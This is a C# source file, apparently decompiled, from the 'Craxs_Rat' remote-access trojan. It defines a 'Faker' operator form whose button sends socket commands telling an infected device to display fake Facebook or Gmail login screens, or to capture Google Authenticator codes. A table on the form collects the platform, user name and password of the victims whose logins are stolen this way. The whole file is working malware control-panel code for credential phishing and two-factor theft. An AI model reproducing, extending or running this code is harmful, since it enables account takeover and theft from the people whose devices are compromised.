using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Faker : Form
{
	private IContainer components;

	[AccessedThroughProperty("MetroSetButton1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _MetroSetButton1;

	public TcpClient Client;

	public Client classClient;

	public string DownloadsFolder;

	public string Title;

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("plat")]
	internal virtual DataGridViewTextBoxColumn plat
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("n")]
	internal virtual DataGridViewTextBoxColumn n
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pass")]
	internal virtual DataGridViewTextBoxColumn pass
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("platfromtext")]
	internal virtual DrakeUIComboBox platfromtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Checkalert")]
	internal virtual DrakeUICheckBox Checkalert
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon MetroSetButton1
	{
		[CompilerGenerated]
		get
		{
			return _MetroSetButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = MetroSetButton1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _MetroSetButton1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_MetroSetButton1 = value;
			drakeUIButtonIcon = _MetroSetButton1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public Faker()
	{
		Title = "null";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.DataGridView1 = new System.Windows.Forms.DataGridView();
		this.plat = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.n = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.pass = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Label2 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.DataGridView1).BeginInit();
		base.SuspendLayout();
		this.DataGridView1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DataGridView1.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DataGridView1.BackgroundColor = System.Drawing.Color.FromArgb(10, 0, 10);
		this.DataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DataGridView1.Columns.AddRange(this.plat, this.n, this.pass);
		this.DataGridView1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DataGridView1.Location = new System.Drawing.Point(0, 104);
		this.DataGridView1.Name = "DataGridView1";
		this.DataGridView1.RowHeadersVisible = false;
		this.DataGridView1.Size = new System.Drawing.Size(354, 214);
		this.DataGridView1.TabIndex = 0;
		this.plat.HeaderText = "Platform";
		this.plat.Name = "plat";
		this.n.HeaderText = "User Name";
		this.n.Name = "n";
		this.pass.HeaderText = "Password";
		this.pass.Name = "pass";
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(12, 9);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(66, 19);
		this.Label2.TabIndex = 19;
		this.Label2.Text = "Platform";
		this.Label1.AutoSize = true;
		this.Label1.Font = new System.Drawing.Font("Calibri", 10f, System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(12, 37);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(83, 19);
		this.Label1.TabIndex = 20;
		this.Label1.Text = "Show Alert";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(10, 0, 10);
		base.ClientSize = new System.Drawing.Size(354, 318);
		base.Controls.Add(this.DataGridView1);
		base.Controls.Add(this.Label1);
		base.Controls.Add(this.Label2);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "Faker";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Faker";
		((System.ComponentModel.ISupportInitialize)this.DataGridView1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void MetroSetButton1_Click(object sender, EventArgs e)
	{
		if (platfromtext.Text.Length < 2)
		{
			Interaction.MsgBox("Select Platform First!!!");
		}
		else
		{
			if (classClient == null)
			{
				return;
			}
			try
			{
				string[] array = classClient.Keys.Split(':');
				string text = "";
				text = ((!Checkalert.Checked) ? "0:" : "1:");
				if (Operators.CompareString(platfromtext.Text, "Facebook", TextCompare: false) == 0)
				{
					text += "fb:fsh";
				}
				else if (Operators.CompareString(platfromtext.Text, "Gmail", TextCompare: false) == 0)
				{
					text += "go:fsh";
				}
				else if (Operators.CompareString(platfromtext.Text, "google authenticator", TextCompare: false) == 0)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "goauth<*>X" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
					return;
				}
				object[] parametersObjects2 = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
